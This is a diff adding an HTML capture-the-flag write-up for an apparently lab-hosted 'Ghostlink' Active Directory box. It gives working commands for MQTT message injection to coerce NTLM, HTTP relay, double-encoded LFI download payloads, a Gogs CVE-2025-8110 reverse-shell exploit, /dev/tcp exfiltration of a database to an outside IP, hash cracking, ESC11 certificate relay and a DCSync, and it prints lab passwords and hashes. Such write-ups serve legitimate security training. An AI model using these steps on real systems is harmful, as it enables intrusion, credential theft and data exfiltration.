@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Write-Ups</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Manrope:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script defer src="script.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <nav style="position:fixed;top:0;left:0;width:100%;z-index:50;display:flex;align-items:center;justify-content:space-between;padding:16px clamp(20px,5vw,56px);background:rgba(10,10,15,.72);backdrop-filter:blur(14px);border-bottom:1px solid var(--bd)">
+          <a href="./index.html" style="display:flex;align-items:center;gap:10px;font-family:'JetBrains Mono',monospace;font-weight:700;font-size:15px;letter-spacing:1px">
+            <span style="display:inline-block;width:9px;height:9px;border-radius:50%;background:var(--ok);box-shadow:0 0 10px var(--ok);animation:pr-dot 1.6s ease-in-out infinite"></span>
+            <span style="color:var(--tx)">PIXEL<span style="color:var(--acc)">RAZER</span></span>
+          </a>
+          <div style="display:flex;align-items:center;gap:6px;font-family:'JetBrains Mono',monospace;font-size:13px">
+            <a href="./Write-up.html" style="padding:9px 15px;border-radius:8px;color:var(--dim);transition:color .25s,background .25s" onMouseOver="this.style.color='#f2f2f5';this.style.background='rgba(255,255,255,.05)'" onMouseOut="this.style.color='#9a9aa8';this.style.background='transparent'">~/write-ups</a>
+            <a href="./index.html#focus" style="padding:9px 15px;border-radius:8px;color:var(--dim);transition:color .25s,background .25s" onMouseOver="this.style.color='#f2f2f5';this.style.background='rgba(255,255,255,.05)'" onMouseOut="this.style.color='#9a9aa8';this.style.background='transparent'">~/focus</a>
+            <a href="./redteam.html" style="padding:9px 15px;border-radius:8px;color:var(--dim);transition:color .25s,background .25s" onMouseOver="this.style.color='#f2f2f5';this.style.background='rgba(255,255,255,.05)'" onMouseOut="this.style.color='#9a9aa8';this.style.background='transparent'">~/red-team</a>
+            <a href="./index.html#contact" style="margin-left:8px;padding:9px 16px;border-radius:8px;color:var(--tx);border:1px solid var(--acc);background:rgba(255,45,117,.08);transition:background .25s,box-shadow .25s" onMouseOver="this.style.background='rgba(255,45,117,.2)';this.style.boxShadow='0 0 22px rgba(255,45,117,.35)'" onMouseOut="this.style.background='rgba(255,45,117,.08)';this.style.boxShadow='none'">contact</a>
+          </div>
+        </nav>
+        <div class="contents">
+            <h1>Ghostlink Write-up</h1>
+            <div class="big-to-normal-image">
+                <img src="images/ghostlink-banner.png" alt="Ghostlink Box">
+            </div>
+            <p>GhostLink is a multi-stage Active Directory box that begins not with a typical web or SMB vector, but with an unexpectedly open MQTT broker on port 1883; enumerating it (subscribing to <code>#</code>) leaks internal subdomains, and abusing its open publish access allows injecting a modified telemetry message that coerces an NTLM authentication back to the attacker, captured via Responder and relayed over HTTP (using ghostsurf) to bypass login on <code>gpz-op26-secure.ghostlink.htb</code>. From there, a double-URL-encoded LFI in the site's download endpoint is used to pull <code>NTUSER.DAT</code> for user <code>svc_canary</code>, and registry analysis via RegRipper surfaces a recently accessed <code>db.zip</code>, recovered through its <code>.lnk</code> shortcut and the same LFI; the archive contains a KeePass database and key file, which cracks open to reveal credentials for <code>vroth</code>. Those credentials grant access to a Gogs instance vulnerable to CVE-2025-8110, yielding code execution and access to Gogs' SQLite database, which is exfiltrated and cracked to recover credentials for <code>nvirelli</code> valid on the Linux host (user flag) and via SMB on the domain controller. Pivoting internally with ligolo-ng, <code>certipy</code> reveals the certificate authority is vulnerable to ESC11 (unenforced ICPR encryption), and an NTLM relay to the CA's RPC/ICPR endpoint triggered by coercing the DC's machine account yields a certificate for <code>DC01$</code>, which is converted to an NTLM hash via <code>certipy auth</code>, enabling a DCSync for the Administrator hash and full domain compromise via WinRM.</p>
+
+            <h2>Reconnaissance</h2>
+            <div class="snippet">
+                <pre class="code-block">Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-08 18:05 -0700
+Nmap scan report for dc01.ghostlink.htb (10.129.50.13)
+Host is up (0.069s latency).
+Not shown: 65512 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Ghost Protocol Zero
+| http-methods:
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-09 09:08:25Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc01.ghostlink.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.ghostlink.htb
+| Not valid before: 2026-03-03T16:53:53
+|_Not valid after:  2027-03-03T16:53:53
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+1883/tcp  open  mqtt
+| mqtt-subscribe:
+|   Topics and their most recent payloads:
+|     $SYS/brokers/client_status/mqttui-a397b0d7: {"status":"offline", "username":"(null)","ts":1783588162207,"reason_code":"0","client_id":"mqttui-a397b0d7","IPv4":"127.0.0.1"}
+|     $SYS/brokers/client_status/mqttui-d48cc9b5: {"status":"offline", "username":"(null)","ts":1783588164273,"reason_code":"0","client_id":"mqttui-d48cc9b5","IPv4":"127.0.0.1"}
+|_    $SYS/brokers/client_status/mqttui-736f7bea: {"status":"online", "username":"(null)", "ts":1783588166348,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-736f7bea","clean_start":1, "IPv4":"127.0.0.1"}
+2179/tcp  open  vmrdp?
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc01.ghostlink.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.ghostlink.htb
+| Not valid before: 2026-03-03T16:53:53
+|_Not valid after:  2027-03-03T16:53:53
+|_ssl-date: TLS randomness does not represent time
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghostlink.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc01.ghostlink.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.ghostlink.htb
+| Not valid before: 2026-03-03T16:53:53
+|_Not valid after:  2027-03-03T16:53:53
+|_ssl-date: TLS randomness does not represent time
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  msrpc         Microsoft Windows RPC
+49685/tcp open  msrpc         Microsoft Windows RPC
+49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49908/tcp open  msrpc         Microsoft Windows RPC
+49924/tcp open  msrpc         Microsoft Windows RPC
+51034/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2026-07-09T09:09:22
+|_  start_date: N/A
+|_clock-skew: 7h59m59s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 272.06 seconds</pre>
+            </div>
+            <p>Most of this is a standard-looking domain controller Kerberos, LDAP, SMB with signing enforced. The port that stands out is <strong>1883 (MQTT)</strong>. MQTT is a lightweight pub/sub messaging protocol commonly used for IoT devices: clients "publish" messages to a topic, and other clients "subscribe" to receive them. We can interact with the broker using <code>mosquitto_pub</code> and <code>mosquitto_sub</code>.</p>
+
+            <h3>Enumerating MQTT</h3>
+            <p>To see what topics and messages are flowing through the broker, we use <code>mosquitto_sub</code>. This requires a client ID, which we can pull straight from the nmap output the entry marked <code>"status":"online"</code> gives us a live client to piggyback on:</p>
+            <div class="snippet">
+                <pre class="code-block">$SYS/brokers/client_status/mqttui-736f7bea: {"status":"online", "username":"(null)", "ts":1783588166348,"proto_name":"MQTT","keepalive":60,"return_code":"0","proto_ver":4,"client_id":"mqttui-736f7bea","clean_start":1, "IPv4":"127.0.0.1"}</pre>
+            </div>
+            <p>To subscribe to <em>all</em> topics, we use the wildcard <code>#</code>:</p>
+            <div class="snippet">
+                <pre class="code-block">mosquitto_sub -h DC01.ghostlink.htb -p 1883 -i mqttui-736f7bea -t '#' -V mqttv5 -v</pre>
+            </div>
+            <div class="small-to-big-image">
+                <img src="images/mqtt-subscribe.png" alt="MQTT Subscribe">
+            </div>
+            <p>A few interesting things show up in the traffic new subdomains: <code>energy-grid.ghostlink.htb</code>, <code>gpz-op26-toolkits.ghostlink.htb</code>, and <code>gpz-op26-secure.ghostlink.htb</code>. The latter two are the most promising:</p>
+            <ul>
+                <li><code>gpz-op26-toolkits.ghostlink.htb</code> a Gogs (self-hosted Git) instance, login required.</li>
+                <li><code>gpz-op26-secure.ghostlink.htb</code> another login-gated site.</li>
+            </ul>
+
+            <h3>Testing MQTT Publish Access</h3>
+            <p>Next question: can we <em>publish</em> to this broker, not just listen? On one terminal, keep the subscriber running:</p>
+            <div class="snippet">
+                <pre class="code-block">mosquitto_sub -h DC01.ghostlink.htb -p 1883 -i mqttui-736f7bea -t '#' -V mqttv5 -v</pre>
+            </div>
+            <p>On a second terminal, try publishing a test message:</p>
+            <div class="snippet">
+                <pre class="code-block">mosquitto_pub -h DC01.ghostlink.htb -p 1883 -r -t "this/is/a/test" -m 'hello'</pre>
+            </div>
+            <img src="images/mqtt-publish-test.png" alt="MQTT Publish Test">
+            <p>The message shows up on the subscriber side publish access is open. This opens the door to a more interesting idea: if we can inject our own IP into one of the legitimate topics, maybe we can trigger an outbound connection back to us and capture an NTLM hash, which we could then try relaying to <code>gpz-op26-secure.ghostlink.htb</code>.</p>
+
+            <h3>Capturing a Hash via MQTT</h3>
+            <p>With Responder listening, we publish a modified telemetry message same structure as the legitimate healthcheck topic, but with our own IP swapped into the <code>url</code> field:</p>
+            <div class="snippet">
+                <pre class="code-block">mosquitto_pub -h DC01.ghostlink.htb -p 1883 -r -t "GhostProtocolZero/systems/node/secureshare/healthcheck" -m '{"timestamp":"2026-09-07-00:36:11","node":"node-6","telemetry":{"healthy":true,"url":"http://$IP/healthcheck","lastCheckSecAgo":24,"responseCode":"200","ip":"172.16.20.10"}}'</pre>
+            </div>
+            <p>This gets a hit on Responder though the hash didn't crack with a standard wordlist.</p>
+            <img src="images/ghostlink-responder-hash.png" alt="Responder Hash Capture">
+
+            <h3>Relaying to gpz-op26-secure.ghostlink.htb</h3>
+            <p>Since cracking didn't pan out, the next move is relaying the captured auth directly. For this I used <a href="https://github.com/senderend/ghostsurf">ghostsurf</a>, a newer HTTP NTLM relay tool that's more stable than <code>ntlmrelayx</code> for this specific use case. (Setup is covered in the repo's README, so I won't repeat it here.)</p>
+            <div class="snippet">
+                <pre class="code-block">sudo ./ghostsurf -t http://gpz-op26-secure.ghostlink.htb/ -k -r</pre>
+            </div>
+            <p>On the first run you'll likely hit this error:</p>
+            <div class="snippet">
+                <pre class="code-block">[-] (HTTP): Exception while Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb: "'NTLMRelayxConfig' object has no attribute 'remove_target'"</pre>
+            </div>
+            <p><strong>Fix:</strong> edit <code>ghostsurf/lib/relay/utils/config.py</code> and add <code>remove_target = False</code> on line 52, then re-run.</p>
+            <img src="images/ghostsurf-fix.png" alt="Ghostsurf Fix">
+            <p>Once the relay lands, clicking the resulting link bypasses authentication entirely.</p>
+            <img src="images/ghostlink-authbypass.png" alt="Auth Bypass">
+
+            <h2>Finding LFI via Upload/Download Endpoints</h2>
+            <p>The site's upload function hung consistently for me, so I switched to Burp Suite routed through the relay's SOCKS proxy (again, not covering that setup here plenty of guides exist). Capturing an upload attempt revealed an <code>/api/upload</code> endpoint.</p>
+            <img src="images/ghostlink-upload-endpoint.png" alt="Upload Endpoint">
+            <p>That raised an obvious question: if there's an upload endpoint, is there a matching <code>/api/download/</code> for retrieval and if so, is it vulnerable to path traversal / LFI? Fuzzing with <code>SecLists/Fuzzing/LFI/LFI-Windows-adeadfed.txt</code> via Burp Intruder (Sniper attack) came up empty at first but <strong>double URL-encoding the payloads</strong> produced a flood of hits.</p>
+            <div class="small-to-big-image">
+                <img src="images/ghostlink-LFI-Fuzzing.png" alt="LFI Fuzzing">
+                <img src="images/ghostlink-LFI-Confirmed.png" alt="LFI Confirmed">
+            </div>
+            <p>LFI confirmed. We also now know a valid username on the box (<code>svc_canary</code>) from the responder, so the next step is pulling <code>NTUSER.DAT</code> for that user to mine it for artifacts.</p>
+            <div class="snippet">
+                <pre class="code-block">Target path:
+//./C:/Users/svc_canary/ntuser.dat
+
+Double URL-encoded:
+%25%32%66%25%32%66%25%32%65%25%32%66%25%34%33%25%33%61%25%32%66%25%35%35%25%37%33%25%36%35%25%37%32%25%37%33%25%32%66%25%37%33%25%37%36%25%36%33%25%35%66%25%36%33%25%36%31%25%36%65%25%36%31%25%37%32%25%37%39%25%32%66%25%36%65%25%37%34%25%37%35%25%37%33%25%36%35%25%37%32%25%32%65%25%36%34%25%36%31%25%37%34</pre>
+            </div>
+            <p>Retrieve it directly via URL:</p>
+            <div class="snippet">
+                <pre class="code-block">http://gpz-op26-secure.ghostlink.htb/api/download/%25%32%66%25%32%66%25%32%65%25%32%66%25%34%33%25%33%61%25%32%66%25%35%35%25%37%33%25%36%35%25%37%32%25%37%33%25%32%66%25%37%33%25%37%36%25%36%33%25%35%66%25%36%33%25%36%31%25%36%65%25%36%31%25%37%32%25%37%39%25%32%66%25%36%65%25%37%34%25%37%35%25%37%33%25%36%35%25%37%32%25%32%65%25%36%34%25%36%31%25%37%34</pre>
+            </div>
+            <p>The downloaded file will be named <code>__._C__Users_svc_canary_ntuser.dat.enc</code> just rename it to <code>ntuser.dat</code>. This registry hive holds recent documents, executed programs, device access history, and persistence mechanisms, so it's worth pulling apart with RegRipper.</p>
+            <p><strong>Note:</strong> pass the full path to <code>ntuser.dat</code>, or RegRipper will error out.</p>
+            <div class="snippet">
+                <pre class="code-block">regripper -r ~/htb/ntuser.dat -p recentdocs</pre>
+            </div>
+            <img src="images/ghostlink-RegRipper.png" alt="RegRipper Output">
+
+            <h2>Following the db.zip Trail</h2>
+            <p>The RegRipper output shows a recently opened file: <code>db.zip</code>. Windows creates a <code>.lnk</code> shortcut for recently accessed files, so we can pull that shortcut to recover the full original path:</p>
+            <div class="snippet">
+                <pre class="code-block">Target path:
+//./C:/Users/svc_canary/AppData/Roaming/Microsoft/Windows/Recent/db.zip.lnk
+
+Double URL-encoded:
+%25%32%66%25%32%66%25%32%65%25%32%66%25%34%33%25%33%61%25%32%66%25%35%35%25%37%33%25%36%35%25%37%32%25%37%33%25%32%66%25%37%33%25%37%36%25%36%33%25%35%66%25%36%33%25%36%31%25%36%65%25%36%31%25%37%32%25%37%39%25%32%66%25%34%31%25%37%30%25%37%30%25%34%34%25%36%31%25%37%34%25%36%31%25%32%66%25%35%32%25%36%66%25%36%31%25%36%64%25%36%39%25%36%65%25%36%37%25%32%66%25%34%64%25%36%39%25%36%33%25%37%32%25%36%66%25%37%33%25%36%66%25%36%36%25%37%34%25%32%66%25%35%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%66%25%35%32%25%36%35%25%36%33%25%36%35%25%36%65%25%37%34%25%32%66%25%36%34%25%36%32%25%32%65%25%36%39%25%37%30%25%32%65%25%36%63%25%36%65%25%36%62</pre>
+            </div>
+            <p>Download and rename it to <code>db.zip.lnk</code>. Running <code>strings</code> against it reveals the full original path:</p>
+            <div class="snippet">
+                <pre class="code-block">OPERAT~1
+MANAGE~1
+db.zip
+C:\Users\svc_canary\Documents\Operations\Management\db.zip
+gpz-op26-secure
+1SPS</pre>
+            </div>
+
+            <h2>Cracking the KeePass Database</h2>
+            <p>With the full path known, <code>db.zip</code> can be downloaded through the same LFI. Extracting it gives two files: <code>db.kdbx</code> and a key file (originally hidden as <code>.key.keyx</code> I renamed it to remove the leading dot so it's visible).</p>
+            <p>With the key file in hand, we can open <code>db.kdbx</code>. Inside, under <strong>Toolkits Repository</strong>, there's a stored credential for <strong>Vesper Roth</strong>:</p>
+            <div class="snippet">
+                <pre class="code-block">vroth:mOo03jpsqx8JQYMBwvFP</pre>
+            </div>
+            <p>(There's also a PDF sitting in the recycle bin that may be useful for a later step.)</p>
+
+            <h2>Gogs RCE (CVE-2025-8110)</h2>
+            <p>With <code>vroth</code>'s credentials, we can log into the Gogs instance at <a href="http://gpz-op26-toolkits.ghostlink.htb/">http://gpz-op26-toolkits.ghostlink.htb/</a>. I couldn't pin down the exact Gogs version from the UI, so I tried known RCEs against it <strong>CVE-2025-8110</strong> worked: <a href="https://github.com/zAbuQasem/gogs-CVE-2025-8110">zAbuQasem/gogs-CVE-2025-8110</a>.</p>
+            <p>The exploit script needed a couple of tweaks: comment out the registration function calls (around line 213), and on lines 209-210 hardcode the username/password to <code>vroth</code>'s credentials.</p>
+            <div class="snippet">
+                <pre class="code-block">python3 CVE-2025-8110.py -u http://gpz-op26-toolkits.ghostlink.htb/ -lh &lt;ATTACKER_IP&gt; -lp 4444</pre>
+            </div>
+            <img src="images/ghostlink-gogs-rce.png" alt="Gogs RCE">
+
+            <h2>Extracting and Cracking the Gogs Database</h2>
+            <p>Gogs stores its data in a SQLite database at <code>/opt/gogs/data/gogs.db</code>. Exfiltrate it via a simple netcat transfer:</p>
+            <div class="snippet">
+                <pre class="code-block"># nc listener to recieve the file
+nc -lvnp 3333 &gt; gogs.db
+
+# to send the gogs.db
+cat gogs.db &gt; /dev/tcp/10.10.14.86/3333</pre>
+            </div>
+            <p>Then dig through it with <code>sqlite3</code>:</p>
+            <div class="snippet">
+                <pre class="code-block">sqlite3 gogs.db
+
+# list tables
+.tables
+
+# extract everything from the user table
+select * from user;
+
+# extract username, salt and password from user table
+select name, salt, passwd from user;</pre>
+            </div>
+            <img src="images/ghostlink-gogs-db.png" alt="Gogs Database">
+            <p>The user <code>nvirelli</code> stands out, since that's also a valid account on the Linux box. Gogs hashes need to be converted into a Hashcat-compatible format before cracking <a href="https://github.com/shinris3n/GogsToHashcat">GogsToHashcat</a> handles that conversion:</p>
+            <div class="snippet">
+                <pre class="code-block">python3 GogsToHashcat.py -o hash DW3YdxPy25 8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f28aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755d3e8</pre>
+            </div>
+            <div class="snippet">
+                <pre class="code-block">hashcat -m 10900 hash ../../SecLists/Passwords/Leaked-Databases/rockyou.txt</pre>
+            </div>
+            <p>(Remember to pass <code>--show</code> afterward to print the cracked result.)</p>
+            <p>Password recovered: <code>u47YUclrDiwWxBheaSzI</code> this authenticates as <code>nvirelli</code>.</p>
+            <div class="snippet">
+                <pre class="code-block">su nvirelli</pre>
+            </div>
+            <img src="images/ghostlink-nvirelli.png" alt="User NVirelli">
+            <p>From here, the user flag is accessible.</p>
+            <p>The same credentials also work against SMB on the DC:</p>
+            <img src="images/ghostlink-smb-access.png" alt="SMB Access">
+
+            <h2>Pivoting Internally</h2>
+            <p>With valid domain credentials in hand, pivot into the internal network using ligolo-ng (setup not covered here standard ligolo-ng agent/proxy workflow).</p>
+
+            <h2>AD CS Enumeration</h2>
+            <p>Once the tunnel is up, enumerate certificate services with <code>certipy</code>:</p>
+            <div class="snippet">
+                <pre class="code-block">certipy find -u 'nvirelli' -p 'u47YUclrDiwWxBheaSzI' -dc-ip &lt;DC_IP&gt; -vulnerable -stdout -debug</pre>
+            </div>
+            <div class="snippet">
+                <pre class="code-block">    CA Name                             : ghostlink-GPZ-OP26-SECURE-CA
+    DNS Name                            : gpz-op26-secure.ghostlink.htb
+    Certificate Subject                 : CN=ghostlink-GPZ-OP26-SECURE-CA, DC=ghostlink, DC=htb
+    Certificate Serial Number           : 3F4302F3D68A6AAE4B792DB93F31CCE5
+    Certificate Validity Start          : 2026-03-03 16:52:14+00:00
+    Certificate Validity End            : 2126-03-03 17:02:12+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : True
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Disabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : GHOSTLINK.HTB\Administrators
+      Access Rights
+        ManageCa                        : GHOSTLINK.HTB\Administrators
+                                          GHOSTLINK.HTB\Domain Admins
+                                          GHOSTLINK.HTB\Enterprise Admins
+        ManageCertificates              : GHOSTLINK.HTB\Administrators
+                                          GHOSTLINK.HTB\Domain Admins
+                                          GHOSTLINK.HTB\Enterprise Admins
+        Enroll                          : GHOSTLINK.HTB\Authenticated Users
+    [!] Vulnerabilities
+      ESC8                              : Web Enrollment is enabled over HTTP.
+      ESC11                             : Encryption is not enforced for ICPR (RPC) requests.
+Certificate Templates                   : [!] Could not find any certificate templates</pre>
+            </div>
+            <p>The CA is vulnerable to <strong>ESC11</strong> (unencrypted ICPR/RPC requests to the CA), which I exploited following <a href="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc11">this ESC11 guide</a>.</p>
+
+            <h2>Exploiting ESC11 via NTLM Relay</h2>
+            <p>Start the ICPR relay listener:</p>
+            <div class="snippet">
+                <pre class="code-block">sudo /home/pixelrazer/venv/bin/python3 /home/pixelrazer/venv/bin/ntlmrelayx.py -t rpc://172.16.20.10 -rpc-mode ICPR -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' -smb2support --template DomainController</pre>
+            </div>
+            <p>With the relay listening, trigger authentication from the DC using NetExec's coerce module:</p>
+            <div class="snippet">
+                <pre class="code-block">netexec smb dc01.ghostlink.htb -u nvirelli -p u47YUclrDiwWxBheaSzI -M coerce_plus -o LISTENER=&lt;ATTACKER_IP&gt;</pre>
+            </div>
+            <p>A successful run looks like this:</p>
+            <img src="images/ghostlink-ESC11-relay.png" alt="ESC11 Relay Success">
+
+            <h2>From Certificate to Domain Admin</h2>
+            <p>The relay produces <code>DC01.pfx</code> a certificate for the DC's machine account. Use <code>certipy auth</code> to convert it into the account's NTLM hash:</p>
+            <div class="snippet">
+                <pre class="code-block">certipy auth -pfx DC01.pfx -dc-ip 10.129.52.14</pre>
+            </div>
+            <img src="images/ghostlink-certipy-auth.png" alt="Certipy Auth">
+            <p>With <code>DC01$</code>'s NT hash, run <code>secretsdump.py</code> to dump the domain's secrets including the Administrator hash:</p>
+            <div class="snippet">
+                <pre class="code-block">secretsdump.py 'ghostlink.htb/dc01$@ghostlink.htb' -hashes aad3b435b51404eeaad3b435b51404ee:49a738167e09e887b884a747be67c411</pre>
+            </div>
+            <p>With the Administrator hash in hand, WinRM access completes the box.</p>
+            <img src="images/ghostlink-Domain-Compromise.png" alt="Full Domain Compromise">
+        </div>
+    </div>
+</body>
+</html>
